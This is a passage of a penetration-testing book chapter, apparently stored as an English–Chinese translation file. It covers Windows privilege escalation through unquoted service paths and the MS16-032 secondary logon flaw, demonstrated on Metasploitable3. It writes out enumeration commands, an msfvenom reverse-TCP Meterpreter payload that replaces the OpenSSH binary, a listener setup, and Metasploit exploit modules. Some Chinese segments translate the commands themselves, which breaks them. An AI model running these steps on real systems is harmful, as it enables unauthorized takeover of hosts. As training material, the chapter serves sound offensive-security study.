- en: '*Chapter 8*: Exploiting Services'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: '*第八章*：利用服务'
- en: Now that you have a good grasp of the common privilege escalation attack vectors
    on Windows, we can take a deeper look at Windows services and begin exploring
    the privilege escalation techniques that leverage vulnerabilities and misconfigurations
    in services in order to elevate our privileges on the target system. The objective
    of this chapter is to identify and exploit vulnerabilities and misconfigurations
    in common Windows services.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
  zh: 现在你已经对 Windows 上常见的权限提升攻击向量有了较好的了解，我们可以更深入地研究 Windows 服务，并开始探索那些利用服务中的漏洞和配置错误来提升权限的技术。本章的目标是识别并利用
    Windows 服务中常见的漏洞和配置错误。
- en: We will explore the process of identifying and exploiting unquoted service paths
    and weak service permissions, and we will then take a look at how to exploit the
    Windows secondary logon in order to elevate our privileges. We will also take
    an in-depth look at the process of identifying and hijacking missing **Dynamic
    Link Libraries** (**DLLs**).
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将探讨识别和利用未加引号的服务路径和弱服务权限的过程，然后我们将看看如何利用 Windows 次级登录来提升我们的权限。我们还将深入研究识别和劫持丢失的**动态链接库**（**DLLs**）的过程。
- en: 'In this chapter, we''re going to cover the following main topics:'
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们将涵盖以下主要内容：
- en: Exploiting services and misconfigurations
  id: totrans-4
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 利用服务和配置错误
- en: Exploiting unquoted service paths
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 利用未加引号的服务路径
- en: Exploiting secondary logon
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 利用次级登录
- en: Exploiting weak service permissions
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 利用弱服务权限
- en: DLL hijacking
  id: totrans-8
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: DLL 劫持
- en: Technical requirements
  id: totrans-9
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 技术要求
- en: To follow along with the demonstrations in this chapter, you will need to ensure
    that you are familiar with Windows CMD commands.
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
  zh: 为了跟随本章中的演示，你需要确保熟悉 Windows CMD 命令。
- en: 'You can view this chapter''s code in action here: [https://bit.ly/3utJTyI](https://bit.ly/3utJTyI)'
  id: totrans-11
  prefs: []
  type: TYPE_NORMAL
  zh: 你可以在这里查看本章的代码示例：[https://bit.ly/3utJTyI](https://bit.ly/3utJTyI)
- en: Exploiting services and misconfigurations
  id: totrans-12
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 利用服务和配置错误
- en: Windows utilizes various services to manage and maintain standard system functionality,
    such as starting services, configuring start up programs, authentication, and
    software installation, to name a few. Our objective is to find vulnerabilities
    and misconfigurations in these services in order to elevate our privileges.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
  zh: Windows 利用各种服务来管理和维持标准系统功能，如启动服务、配置启动程序、身份验证和软件安装等等。我们的目标是找到这些服务中的漏洞和配置错误，从而提升我们的权限。
- en: This process is dynamic and, as a result, will depend on the target configuration
    and deployment use case, primarily because the techniques involved in this process
    will depend on the implementation and configuration of particular services.
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
  zh: 这个过程是动态的，因此将依赖于目标配置和部署的使用情况，主要是因为涉及的技术将依赖于特定服务的实现和配置。
- en: Given the robust nature of this process and the techniques used, we will be
    utilizing the Metasploitable3 virtual machine that we set up in [*Chapter 2*](B17389_02_Final_PG_ePub.xhtml#_idTextAnchor030),
    *Setting Up Our Lab*, of this book.
  id: totrans-15
  prefs: []
  type: TYPE_NORMAL
  zh: 鉴于这一过程的强大性质和所使用的技术，我们将使用我们在本书的[*第二章*](B17389_02_Final_PG_ePub.xhtml#_idTextAnchor030)“*搭建我们的实验环境*”中设置的
    Metasploitable3 虚拟机。
- en: This is because the Metasploitable3 virtual machine runs on Windows Server 2008
    and has been configured to be run as a server, as well as hosting various services
    and applications.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
  zh: 这是因为 Metasploitable3 虚拟机运行在 Windows Server 2008 上，并且已配置为作为服务器运行，同时托管各种服务和应用程序。
- en: This robust configuration of applications provides a great real-world scenario
    for a practical demonstration of the tools and techniques that we will be using
    in this chapter.
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
  zh: 这个强大的应用程序配置提供了一个非常现实的场景，可以实际演示我们将在本章中使用的工具和技术。
- en: Before we begin, ensure that you have a foothold on the target system and have
    access through a command shell or Meterpreter session.
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们开始之前，请确保你已经在目标系统上站稳了脚跟，并且能够通过命令行或 Meterpreter 会话访问该系统。
- en: The techniques and tools used in this chapter will involve utilizing native
    Windows commands and specific Meterpreter modules to automate various aspects
    of the process.
  id: totrans-19
  prefs: []
  type: TYPE_NORMAL
  zh: 本章中使用的技术和工具将涉及利用本地 Windows 命令和特定的 Meterpreter 模块来自动化该过程的各个方面。
- en: Exploiting unquoted service paths
  id: totrans-20
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 利用未加引号的服务路径
- en: 'When starting or running services, Windows requires the location of the target
    executable in order to run. The path of the executable is typically encapsulated
    by quotation marks, which allows Windows to locate the path or location of the
    executable. The following path is an example of a secure service path:'
  id: totrans-21
  prefs: []
  type: TYPE_NORMAL
  zh: 在启动或运行服务时，Windows 需要目标可执行文件的位置来执行。可执行文件的路径通常用引号括起来，这样 Windows 就能定位可执行文件的路径或位置。以下路径是一个安全的服务路径示例：
- en: '"C:\Program Files\OpenSSH\bin\cygrunsrv.exe"'
  id: totrans-22
  prefs: []
  type: TYPE_NORMAL
  zh: '"C:\Program Files\OpenSSH\bin\cygrunsrv.exe"'
- en: 'If the path of the executable is not encapsulated by quotation marks, Windows
    will resort to searching for the executable in every directory and executing each
    one until it locates the target executable. We can leverage this vulnerability
    to elevate our privileges by identifying a service that runs under administrative
    privileges and that is not encapsulated in quotation marks. The following path
    is an example of an insecure service path that we can exploit:'
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
  zh: 如果可执行文件的路径没有被引号包围，Windows 将会搜索每个目录并执行每个文件，直到找到目标可执行文件。我们可以利用此漏洞，通过识别一个在管理员权限下运行且未被引号包围的服务来提升我们的权限。以下路径是我们可以利用的不安全服务路径示例：
- en: C:\Program Files\OpenSSH\bin\cygrunsrv.exe
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
  zh: C:\Program Files\OpenSSH\bin\cygrunsrv.exe
- en: The exploitation process involves generating and uploading a binary to the target
    system, which will provide us with an elevated reverse shell or Meterpreter session
    when executed.
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
  zh: 利用过程涉及生成并上传一个二进制文件到目标系统，当执行时，它将为我们提供一个提权的反向 shell 或 Meterpreter 会话。
- en: 'This technique can be recreated by following this procedure:'
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 可以按照以下步骤重现此技术：
- en: 'The first step in this process involves identifying a service path that is
    not encapsulated by quotation marks, which can be done by utilizing the **Windows
    Management Instrumentation** (**WMIC**) interface in conjunction with the **findstr**
    utility. This can be done by running the following command in the Windows command
    shell on the target system:'
  id: totrans-27
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 该过程的第一步是识别未被引号包围的服务路径，可以通过使用**Windows 管理工具**（**WMIC**）接口结合**findstr**工具来完成。在目标系统的
    Windows 命令行中运行以下命令即可完成此操作：
- en: '**wmic service get name,displayname,pathname,startmode |findstr /i /v "c:\"
    |findstr /i /v """**'
  id: totrans-28
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**wmic service get name,displayname,pathname,startmode |findstr /i /v "c:\"
    |findstr /i /v """**'
- en: 'This command will output a list of services with unquoted service paths; in
    our case, we were able to identify a plethora of services with unquoted paths
    that we can exploit. As highlighted in the following screenshot, we can use the
    OpenSSH service path:'
  id: totrans-29
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 此命令将输出一个带有未加引号服务路径的服务列表；在我们的案例中，我们能够识别出许多未加引号的服务路径，且可以利用它们。如以下截图所示，我们可以利用 OpenSSH
    服务路径：
- en: '![Figure 8.1 – Finding unquoted service paths'
  id: totrans-30
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 8.1 – 查找未加引号的服务路径'
- en: '](Images/B17389_08_001.jpg)'
  id: totrans-31
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_001.jpg)'
- en: Figure 8.1 – Finding unquoted service paths
  id: totrans-32
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.1 – 查找未加引号的服务路径
- en: The reason we are utilizing the OpenSSH service is that the service requires
    administrative privileges to run and, as a result, is executed under the administrative
    user.
  id: totrans-33
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们使用 OpenSSH 服务的原因是该服务需要管理员权限才能运行，因此它是在管理员用户下执行的。
- en: 'The next step involves checking the directory permissions in order to determine
    whether we can write or make changes to the OpenSSH service directory. We can
    check the permissions of the directory by utilizing the **Integrity Control Access
    Control Lists** (**icacls**) utility by running the following command:'
  id: totrans-34
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下一步是检查目录权限，以确定我们是否能够写入或更改 OpenSSH 服务目录的内容。我们可以使用**完整性控制访问控制列表**（**icacls**）工具检查目录的权限，通过运行以下命令：
- en: '**icacls "C:\Program Files\OpenSSH"**'
  id: totrans-35
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**icacls "C:\Program Files\OpenSSH"**'
- en: 'As highlighted in the following screenshot, this will output the directory
    permissions; in this case, standard users on the system have write permissions,
    therefore giving us the ability to make changes to the contents of the directory
    as we are part of the **BUILTIN\Users** group:'
  id: totrans-36
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下截图所示，运行此命令会输出目录权限；在此案例中，系统上的标准用户具有写入权限，因此我们可以修改该目录的内容，因为我们是**BUILTIN\Users**组的成员：
- en: '![Figure 8.2 – Service path permissions'
  id: totrans-37
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 8.2 – 服务路径权限'
- en: '](Images/B17389_08_002.jpg)'
  id: totrans-38
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_002.jpg)'
- en: Figure 8.2 – Service path permissions
  id: totrans-39
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.2 – 服务路径权限
- en: We can leverage this misconfiguration to elevate our privileges by replacing
    the OpenSSH executable with a reverse shell binary. Once the OpenSSH service has
    been started or restarted, the reverse shell binary will be executed instead of
    the OpenSSH executable.
  id: totrans-40
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们可以利用这个错误配置来提升权限，通过将 OpenSSH 可执行文件替换为反向 shell 二进制文件。一旦 OpenSSH 服务已启动或重新启动，反向
    shell 二进制文件将被执行，而不是 OpenSSH 可执行文件。
- en: Tip
  id: totrans-41
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 提示
- en: The reverse shell payload should have the same name as the service we are trying
    to exploit and should be uploaded to the respective service path we identified
    earlier.
  id: totrans-42
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 反向 shell 有效负载应该与我们尝试利用的服务名称相同，并且应该上传到我们之前确定的相应服务路径。
- en: 'We can generate the Meterpreter payload with **msfvenom** and save it as an
    executable. This can be done by running the following command in Kali:'
  id: totrans-43
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以使用**msfvenom**生成 Meterpreter 有效负载并将其保存为可执行文件。可以通过在 Kali 中运行以下命令来实现：
- en: '**msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LISTENER-IP> LPORT=<PORT>
    -f exe > /home/kali/Desktop/cygrunsrv.exe**'
  id: totrans-44
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LISTENER-IP> LPORT=<PORT>
    -f exe > /home/kali/Desktop/cygrunsrv.exe**'
- en: 'After generating the payload, we can upload it to the OpenSSH service path,
    as follows:'
  id: totrans-45
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在生成有效负载后，我们可以将其上传到 OpenSSH 服务路径，如下所示：
- en: C:\Program Files\OpenSSH\bin
  id: totrans-46
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: C:\Program Files\OpenSSH\bin
- en: 'Before we can upload the Meterpreter payload, we need to change the name of
    the original binary. However, it is recommended to take a backup of the original
    binary in the event that the process does not work as expected. The original executable
    can be deleted by running the following command in the Meterpreter session:'
  id: totrans-47
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在上传 Meterpreter 有效负载之前，我们需要更改原始二进制文件的名称。然而，建议在该过程没有按预期工作时备份原始二进制文件。可以通过在 Meterpreter
    会话中运行以下命令删除原始可执行文件：
- en: '**rm cygrunsrv.exe**'
  id: totrans-48
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**删除 cygrunsrv.exe**'
- en: 'We can now upload the Meterpreter executable to the OpenSSH service path on
    the target using Meterpreter by running the following command:'
  id: totrans-49
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们现在可以通过运行以下命令，将 Meterpreter 可执行文件上传到目标的 OpenSSH 服务路径：
- en: '**upload /home/kali/Desktop/cygrunsrv.exe**'
  id: totrans-50
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**上传 /home/kali/Desktop/cygrunsrv.exe**'
- en: In the event you are using a standard command shell, you can use the **certutil**
    utility to transfer the binary to the target system.
  id: totrans-51
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果你使用的是标准命令 shell，可以使用 **certutil** 工具将二进制文件传输到目标系统。
- en: As illustrated in the following screenshot, this will upload the Meterpreter
    executable to the OpenSSH service path:![Figure 8.3 – Uploading the Meterpreter
    payload
  id: totrans-52
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如下图所示，这将把 Meterpreter 可执行文件上传到 OpenSSH 服务路径：![图 8.3 – 上传 Meterpreter 有效负载]
- en: '](Images/B17389_08_003.jpg)'
  id: totrans-53
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_003.jpg)'
- en: Figure 8.3 – Uploading the Meterpreter payload
  id: totrans-54
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.3 – 上传 Meterpreter 有效负载
- en: 'We now need to set up the Meterpreter listener with Metasploit. This can be
    done by running the following command in the Metasploit console:'
  id: totrans-55
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们现在需要使用 Metasploit 设置 Meterpreter 监听器。这可以通过在 Metasploit 控制台中运行以下命令来完成：
- en: '**use /exploit/multi/handler**'
  id: totrans-56
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**使用 /exploit/multi/handler**'
- en: 'The next step involves specifying the payload we used to create the binary
    with **msfvenom**. This can be done by running the following command:'
  id: totrans-57
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下一步是指定我们用 **msfvenom** 创建二进制文件时所使用的有效负载。这可以通过运行以下命令来完成：
- en: '**set payload /windows/x64/meterpreter/reverse_tcp**'
  id: totrans-58
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**设置有效负载 /windows/x64/meterpreter/reverse_tcp**'
- en: We now need to configure the module options. In this case, we need to configure
    the **LHOST** and **LPORT** options as highlighted in the following screenshot:![Figure
    8.4 – Meterpreter payload options
  id: totrans-59
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们现在需要配置模块选项。在此情况下，我们需要配置 **LHOST** 和 **LPORT** 选项，如下图所示：![图 8.4 – Meterpreter
    有效负载选项]
- en: '](Images/B17389_08_004.jpg)'
  id: totrans-60
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_004.jpg)'
- en: Figure 8.4 – Meterpreter payload options
  id: totrans-61
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.4 – Meterpreter 有效负载选项
- en: 'After setting the module options, we can start the listener by running the
    following command:'
  id: totrans-62
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在设置模块选项后，我们可以通过运行以下命令启动监听器：
- en: '**run**'
  id: totrans-63
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**运行**'
- en: The listener will listen for any incoming connections from the payload we generated
    with **msfvenom**.
  id: totrans-64
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 监听器将会监听来自我们使用**msfvenom**生成的有效负载的任何传入连接。
- en: 'In order to execute the Meterpreter executable, we need to restart the OpenSSH
    service. This can be done by running the following commands in the Windows command
    shell:'
  id: totrans-65
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了执行 Meterpreter 可执行文件，我们需要重启 OpenSSH 服务。这可以通过在 Windows 命令 shell 中运行以下命令来完成：
- en: '**sc stop OpenSSHd**'
  id: totrans-66
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sc stop OpenSSHd**'
- en: '**sc start OpenSSHd**'
  id: totrans-67
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sc start OpenSSHd**'
- en: As illustrated in the following screenshot, this will restart the OpenSSH service
    and in turn, we should receive a privileged Meterpreter session on our listener:![Figure
    8.5 – Meterpreter session
  id: totrans-68
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如下图所示，这将重新启动 OpenSSH 服务，接着我们应该会在监听器上收到一个特权的 Meterpreter 会话：![图 8.5 – Meterpreter
    会话]
- en: '](Images/B17389_08_005.jpg)'
  id: totrans-69
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_005.jpg)'
- en: Figure 8.5 – Meterpreter session
  id: totrans-70
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图8.5 – Meterpreter会话
- en: 'We can verify that we have an elevated Meterpreter session by running the following
    command:'
  id: totrans-71
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以通过运行以下命令来验证我们是否有升级的Meterpreter会话：
- en: '**getuid**'
  id: totrans-72
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**getuid**'
- en: 'As illustrated in the following screenshot, we have successfully elevated our
    privileges and should have a Meterpreter session with administrative privileges:'
  id: totrans-73
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下截图所示，我们已成功提升权限，并应该具有具有管理权限的Meterpreter会话：
- en: '![Figure 8.6 – Unquoted service path Meterpreter privileges'
  id: totrans-74
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图8.6 – 未引用服务路径Meterpreter权限'
- en: '](Images/B17389_08_006.jpg)'
  id: totrans-75
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_006.jpg)'
- en: Figure 8.6 – Unquoted service path Meterpreter privileges
  id: totrans-76
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图8.6 – 未引用服务路径Meterpreter权限
- en: 'We can also automate the process by using a Metasploit module to identify and
    exploit a target service with an unquoted service path and automatically upload
    a reverse shell payload that will provide us with an elevated Meterpreter session.
    This can be done by running the following command in the Metasploit console:'
  id: totrans-77
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们还可以通过使用Metasploit模块自动化流程来识别和利用具有未引用服务路径的目标服务，并自动上传一个提供我们升级Meterpreter会话的反向shell有效负载。这可以通过在Metasploit控制台中运行以下命令来完成：
- en: '**use exploit/windows/local/unquoted_service_path**'
  id: totrans-78
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**use exploit/windows/local/unquoted_service_path**'
- en: 'After loading the module, we need to configure the module options. In this
    case, we need to configure the **SESSION** ID and target payload as highlighted
    in the following screenshot:'
  id: totrans-79
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 加载模块后，我们需要配置模块选项。在这种情况下，我们需要配置**SESSION** ID和目标有效负载，如下截图所示：
- en: '![Figure 8.7 – Unquoted service path module options'
  id: totrans-80
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图8.7 – 未引用服务路径模块选项'
- en: '](Images/B17389_08_007.jpg)'
  id: totrans-81
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_007.jpg)'
- en: Figure 8.7 – Unquoted service path module options
  id: totrans-82
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图8.7 – 未引用服务路径模块选项
- en: 'After configuring the module options, we can launch the module by running the
    following command in the Metasploit console:'
  id: totrans-83
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在配置模块选项后，我们可以通过在Metasploit控制台中运行以下命令来启动模块：
- en: '**run**'
  id: totrans-84
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**run**'
- en: 'As highlighted in the following screenshot, if the module runs successfully,
    we should receive a Meterpreter session with elevated privileges:'
  id: totrans-85
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下截图所示，如果模块成功运行，我们应该收到一个具有提升权限的Meterpreter会话：
- en: '![Figure 8.8 – Unquoted service path Meterpreter session'
  id: totrans-86
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图8.8 – 未引用服务路径Meterpreter会话'
- en: '](Images/B17389_08_008.jpg)'
  id: totrans-87
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_008.jpg)'
- en: Figure 8.8 – Unquoted service path Meterpreter session
  id: totrans-88
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图8.8 – 未引用服务路径Meterpreter会话
- en: 'We can verify that we have an elevated Meterpreter session by running the following
    command:'
  id: totrans-89
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以通过运行以下命令来验证我们是否有升级的Meterpreter会话：
- en: '**getuid**'
  id: totrans-90
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**getuid**'
- en: 'As highlighted in the following screenshot, we have successfully elevated our
    privileges and should have a Meterpreter session with administrative privileges:'
  id: totrans-91
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下截图所示，我们已成功提升权限，并应该具有具有管理权限的Meterpreter会话：
- en: '![Figure 8.9 – Unquoted service path Meterpreter privileges'
  id: totrans-92
  prefs: []
  type: TYPE_NORMAL
  zh: '![图8.9 – 未引用服务路径Meterpreter权限'
- en: '](Images/B17389_08_009.jpg)'
  id: totrans-93
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_009.jpg)'
- en: Figure 8.9 – Unquoted service path Meterpreter privileges
  id: totrans-94
  prefs: []
  type: TYPE_NORMAL
  zh: 图8.9 – 未引用服务路径Meterpreter权限
- en: We have now been able to successfully elevate our privileges through unquoted
    service paths and can explore the process of exploiting the secondary logon handle.
  id: totrans-95
  prefs: []
  type: TYPE_NORMAL
  zh: 我们现在已成功通过未引用服务路径提升了权限，并可以探索利用次级登录句柄的过程。
- en: Exploiting secondary logon
  id: totrans-96
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 利用次级登录
- en: 'The secondary logon is a Windows service that is used by administrators to
    perform administrative tasks through a standard system account. This service can
    be exploited through an inherent vulnerability that affects the following versions
    of Windows:'
  id: totrans-97
  prefs: []
  type: TYPE_NORMAL
  zh: 次级登录是Windows服务，管理员可以通过标准系统帐户执行管理任务。该服务可以通过影响以下Windows版本的固有漏洞而被利用：
- en: Windows 7
  id: totrans-98
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Windows 7
- en: Windows Server 2008
  id: totrans-99
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Windows Server 2008
- en: Windows 8.1
  id: totrans-100
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Windows 8.1
- en: Windows Server 2012
  id: totrans-101
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Windows Server 2012
- en: Windows 10
  id: totrans-102
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: Windows 10
- en: The exploitation process leverages the lack of sanitization of handles in the
    secondary logon service, which can allow a user to duplicate a system service
    thread handle.
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
  zh: 利用过程利用了次级登录服务中句柄的不规范化，这可以允许用户复制系统服务线程句柄。
- en: 'In this section, we will take a look at how to exploit this vulnerability both
    manually and automatically using the Metasploit framework. It is important to
    note, however, that the exploit requires certain dependencies to be met in order
    for this process to work:'
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们将看看如何手动和自动利用Metasploit框架来利用此漏洞。然而，需要注意的是，利用需要满足一定的依赖关系才能使此过程正常工作：
- en: The target system should have two or more CPU cores.
  id: totrans-105
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 目标系统应该有两个或更多CPU核心。
- en: The target system should be running PowerShell V2.0 or later.
  id: totrans-106
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 目标系统应运行 PowerShell V2.0 或更高版本。
- en: 'More information regarding this exploit can be found here: [https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032).'
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
  zh: 有关此漏洞的更多信息，请参见：[https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032)。
- en: Before we begin, ensure that you have a foothold on the target system and have
    access through a command shell or Meterpreter session.
  id: totrans-108
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们开始之前，请确保你已经在目标系统上占据了一个立足点，并通过命令行外壳或 Meterpreter 会话获取访问权限。
- en: 'Now that we have an understanding of how the exploitation process works, we
    can take a look at how to exploit the vulnerability to elevate our privileges:'
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经了解了利用过程的工作原理，我们可以看看如何利用这个漏洞来提升我们的权限：
- en: 'We have already taken an in-depth look at how to search for and identify exploits
    in [*Chapter 4*](B17389_04_Final_PG_ePub.xhtml#_idTextAnchor058), *Performing
    Local Enumeration*, and were able to deduce that the Metasploitable3 virtual machine
    is vulnerable to this attack. We can begin the process by utilizing a Metasploit
    module that automates the exploitation process. This can be done by loading the
    following module in the Metasploit console:'
  id: totrans-110
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们已经深入了解了如何在[*第 4 章*](B17389_04_Final_PG_ePub.xhtml#_idTextAnchor058)《执行本地枚举》中搜索和识别漏洞，并能够推断出
    Metasploitable3 虚拟机易受此攻击。我们可以通过利用 Metasploit 模块来自动化利用过程，来开始这一过程。可以通过在 Metasploit
    控制台中加载以下模块来实现：
- en: '**use exploit/windows/local/ms16_032_secondary_logon_handle_privesc**'
  id: totrans-111
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**use exploit/windows/local/ms16_032_secondary_logon_handle_privesc**'
- en: 'After loading the module, we need to configure the module options. In this
    case, we need to set the default payload, session ID, **LPORT**, and **LHOST**
    options, as highlighted in the following screenshot:'
  id: totrans-112
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 加载模块后，我们需要配置模块选项。在这种情况下，我们需要设置默认有效载荷、会话 ID、**LPORT** 和 **LHOST** 选项，如下截图所示：
- en: '![Figure 8.10 – Secondary logon handle module options'
  id: totrans-113
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 8.10 – 次级登录句柄模块选项'
- en: '](Images/B17389_08_010.jpg)'
  id: totrans-114
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_010.jpg)'
- en: Figure 8.10 – Secondary logon handle module options
  id: totrans-115
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.10 – 次级登录句柄模块选项
- en: 'After configuring the module options, we can launch the module by running the
    following command in the Metasploit console:'
  id: totrans-116
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 配置完模块选项后，我们可以通过在 Metasploit 控制台中运行以下命令来启动该模块：
- en: '**run**'
  id: totrans-117
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**run**'
- en: 'As illustrated in the following screenshot, if the module runs successfully,
    we should receive a Meterpreter session with elevated privileges:'
  id: totrans-118
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下截图所示，如果模块成功运行，我们应该会收到一个具有提升权限的Meterpreter会话：
- en: '![Figure 8.11 – Secondary logon handle exploit successful](Images/B17389_08_011.jpg)'
  id: totrans-119
  prefs:
  - PREF_IND
  type: TYPE_IMG
  zh: '![图 8.11 – 次级登录句柄利用成功](Images/B17389_08_011.jpg)'
- en: Figure 8.11 – Secondary logon handle exploit successful
  id: totrans-120
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.11 – 次级登录句柄利用成功
- en: 'We can verify that we have an elevated Meterpreter session by running the following
    command:'
  id: totrans-121
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以通过运行以下命令来验证我们是否拥有提升权限的 Meterpreter 会话：
- en: '**getuid**'
  id: totrans-122
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**getuid**'
